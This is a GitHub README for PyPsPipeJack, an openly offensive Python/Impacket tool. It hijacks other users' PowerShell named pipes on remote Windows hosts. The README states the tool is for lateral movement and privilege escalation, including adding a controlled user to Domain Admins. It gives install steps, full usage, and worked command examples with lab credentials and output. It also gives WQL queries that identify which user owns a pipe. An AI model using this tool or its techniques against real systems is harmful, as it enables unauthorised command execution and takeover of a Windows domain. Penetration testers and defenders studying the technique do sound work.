# https://github.com/e-fin/PyPsPipeJack

[Skip to content](https://github.com/e-fin/PyPsPipeJack#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/e-fin/PyPsPipeJack) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/e-fin/PyPsPipeJack) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/e-fin/PyPsPipeJack) to refresh your session.Dismiss alert

{{ message }}

[e-fin](https://github.com/e-fin)/ **[PyPsPipeJack](https://github.com/e-fin/PyPsPipeJack)** Public

- [Notifications](https://github.com/login?return_to=%2Fe-fin%2FPyPsPipeJack) You must be signed in to change notification settings
- [Fork\\
2](https://github.com/login?return_to=%2Fe-fin%2FPyPsPipeJack)
- [Star\\
23](https://github.com/login?return_to=%2Fe-fin%2FPyPsPipeJack)


main

[**1** Branch](https://github.com/e-fin/PyPsPipeJack/branches) [**0** Tags](https://github.com/e-fin/PyPsPipeJack/tags)

[Go to Branches page](https://github.com/e-fin/PyPsPipeJack/branches)[Go to Tags page](https://github.com/e-fin/PyPsPipeJack/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![e-fin](https://avatars.githubusercontent.com/u/48696533?v=4&size=40)](https://github.com/e-fin)[e-fin](https://github.com/e-fin/PyPsPipeJack/commits?author=e-fin)

[updated readme](https://github.com/e-fin/PyPsPipeJack/commit/7dd8bdcc39df57b21610146d0549c9ed2c460586)

3 weeks agoAug 9, 2026

[7dd8bdc](https://github.com/e-fin/PyPsPipeJack/commit/7dd8bdcc39df57b21610146d0549c9ed2c460586) · 3 weeks agoAug 9, 2026

## History

[14 Commits](https://github.com/e-fin/PyPsPipeJack/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/e-fin/PyPsPipeJack/commits/main/) 14 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [media](https://github.com/e-fin/PyPsPipeJack/tree/main/media "media") | [media](https://github.com/e-fin/PyPsPipeJack/tree/main/media "media") | [wmiquery memes](https://github.com/e-fin/PyPsPipeJack/commit/4822dc0be1dbaac21589694cd518613789fc5c46 "wmiquery memes") | 3 weeks agoAug 8, 2026 |
| [pspipe](https://github.com/e-fin/PyPsPipeJack/tree/main/pspipe "pspipe") | [pspipe](https://github.com/e-fin/PyPsPipeJack/tree/main/pspipe "pspipe") | [Fixed session timeout issues in interactive mode](https://github.com/e-fin/PyPsPipeJack/commit/e2dd3afed928d90b8290e329c6517175cb85a2e0 "Fixed session timeout issues in interactive mode") | 3 weeks agoAug 9, 2026 |
| [.gitignore](https://github.com/e-fin/PyPsPipeJack/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/e-fin/PyPsPipeJack/blob/main/.gitignore ".gitignore") | [fixed gitignore](https://github.com/e-fin/PyPsPipeJack/commit/b6398685c1ca4e1716b4e1c9a4dbb8fcfcb47f84 "fixed gitignore") | 3 weeks agoAug 8, 2026 |
| [PyPsPipeJack.py](https://github.com/e-fin/PyPsPipeJack/blob/main/PyPsPipeJack.py "PyPsPipeJack.py") | [PyPsPipeJack.py](https://github.com/e-fin/PyPsPipeJack/blob/main/PyPsPipeJack.py "PyPsPipeJack.py") | [fixed timeout issues, added --script option, interactive semi-working](https://github.com/e-fin/PyPsPipeJack/commit/9ce481efc24abf3f4d18245921ec6ee02a78f98a "fixed timeout issues, added --script option, interactive semi-working") | 3 weeks agoAug 9, 2026 |
| [README.md](https://github.com/e-fin/PyPsPipeJack/blob/main/README.md "README.md") | [README.md](https://github.com/e-fin/PyPsPipeJack/blob/main/README.md "README.md") | [updated readme](https://github.com/e-fin/PyPsPipeJack/commit/7dd8bdcc39df57b21610146d0549c9ed2c460586 "updated readme") | 3 weeks agoAug 9, 2026 |
| [requirements.txt](https://github.com/e-fin/PyPsPipeJack/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/e-fin/PyPsPipeJack/blob/main/requirements.txt "requirements.txt") | [comment](https://github.com/e-fin/PyPsPipeJack/commit/fdd93deaaa437101ed002d2c40f584a9fba56603 "comment") | 3 weeks agoAug 7, 2026 |
| View all files |

## Repository files navigation

# PyPsPipeJack

[Permalink: PyPsPipeJack](https://github.com/e-fin/PyPsPipeJack#pypspipejack)

This tool is the continuation of my other tool, OpenPsPipeJack. This one is python based and works on Linux largely using Impacket.

In summary, if you have local admin on a remote host, you can connect to remote PowerShell sessions on that host and execute commands within those PowerShell sessions. Not only does this provide lateral movement opportunities, but also privilege escalation opportunities. For example, if you get local admin access through something like RBCD, Shadow Credentials, etc and their is a Domain Admin on the remote host with a PowerShell session open, you can run commands as the domain admin and add a user you control to the Domain Admins group.

## Installation

[Permalink: Installation](https://github.com/e-fin/PyPsPipeJack#installation)

```
git clone https://github.com/e-fin/PyPsPipeJack.git
cd PyPsPipeJack
python3 -m venv .
source bin/activate
python3 -m pip install -r requirements
```

## Usage

[Permalink: Usage](https://github.com/e-fin/PyPsPipeJack#usage)

```
usage: PyPsPipeJack.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] target

PowerShell Pipe Jacker

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

PowerShell Pipes:
  --list                list PSHost pipes and exit
  --pipe PIPE           full pipe name under IPC$ to connect to
  --command COMMAND     run one command and exit (non-interactive)
  --script SCRIPT       run entire PS1 file
```

## Examples

[Permalink: Examples](https://github.com/e-fin/PyPsPipeJack#examples)

### List Remote PSHost Pipes (Credentials)

[Permalink: List Remote PSHost Pipes (Credentials)](https://github.com/e-fin/PyPsPipeJack#list-remote-pshost-pipes-credentials)

```
$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list

PSHost pipes on target:
   PSHost.134296493751823186.13108.DefaultAppDomain.powershell
```

### List Remote PSHost Pipes (Kerberos)

[Permalink: List Remote PSHost Pipes (Kerberos)](https://github.com/e-fin/PyPsPipeJack#list-remote-pshost-pipes-kerberos)

```
$ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --list

PSHost pipes on target:
   PSHost.134296493751823186.13108.DefaultAppDomain.powershell
```

### Connect to Remote PSHost Pipe (Credentials)

[Permalink: Connect to Remote PSHost Pipe (Credentials)](https://github.com/e-fin/PyPsPipeJack#connect-to-remote-pshost-pipe-credentials)

```
$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'

LAB\administrator
```

### Connect to Remote PSHost Pipe (Kerberos)

[Permalink: Connect to Remote PSHost Pipe (Kerberos)](https://github.com/e-fin/PyPsPipeJack#connect-to-remote-pshost-pipe-kerberos)

```
$ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'

LAB\administrator
```

### Connect to Remote PSHost Pipe INTERACTIVE

[Permalink: Connect to Remote PSHost Pipe INTERACTIVE](https://github.com/e-fin/PyPsPipeJack#connect-to-remote-pshost-pipe-interactive)

```
$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell

Connected. Enter PowerShell commands; 'exit' to quit.
PS> whoami
lab\administrator
PS> $i = "hello"
PS> echo $i
hello
PS>
```

### Connect to Remote PSHost Pipe and Run PS1 Script

[Permalink: Connect to Remote PSHost Pipe and Run PS1 Script](https://github.com/e-fin/PyPsPipeJack#connect-to-remote-pshost-pipe-and-run-ps1-script)

```
$ cat test.ps1
echo hello
echo hello2
whoami
ipconfig

$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --script test.ps1

hello
hello2
lab\administrator

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : lab.local
   Link-local IPv6 Address . . . . . : fe80::f0d3:c6c2:48ad:94f5%13
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::20c:29ff:fe9d:a180%13
                                       192.168.1.1
```

### Find Which User Owns the PowerShell Pipe Without Command Execution (WMIQUERY)

[Permalink: Find Which User Owns the PowerShell Pipe Without Command Execution (WMIQUERY)](https://github.com/e-fin/PyPsPipeJack#find-which-user-owns-the-powershell-pipe-without-command-execution-wmiquery)

No need to run whoami, or whatever PowerShell command to see who the PowerShell pipe belongs to. We can check with wmiquery.py form impacket. Wmi Query Language is massivly unerappreciated.

Here are the commands you need to run a with a screenshot example:

```
## Replace 13108 with PID from PSHost Pipe
# Example: PSHost.134296493751823186.13108.DefaultAppDomain.powershell

WQL> ASSOCIATORS OF {Win32_Process.Handle="13108"} WHERE AssocClass=Win32_SessionProcess

WQL> SELECT * FROM Win32_LoggedOnUser
```

[![Alt text](https://github.com/e-fin/PyPsPipeJack/raw/main/media/wmiquery.png)](https://github.com/e-fin/PyPsPipeJack/blob/main/media/wmiquery.png)

## ToDo

[Permalink: ToDo](https://github.com/e-fin/PyPsPipeJack#todo)

- [ ]  Allow execution of whole PowerShell file
- [ ]  Interactive PowerShell console
- [ ]  Find better way to determine who the PSHost pipe belongs to

## About

Python implementation of OpenPsPipeJack

### Resources

[Readme](https://github.com/e-fin/PyPsPipeJack#readme-ov-file)

[Activity](https://github.com/e-fin/PyPsPipeJack/activity)

### Stars

**23** stars

### Watchers

**0** watching

### Forks

[**2** forks](https://github.com/e-fin/PyPsPipeJack/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fe-fin%2FPyPsPipeJack&report=e-fin+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.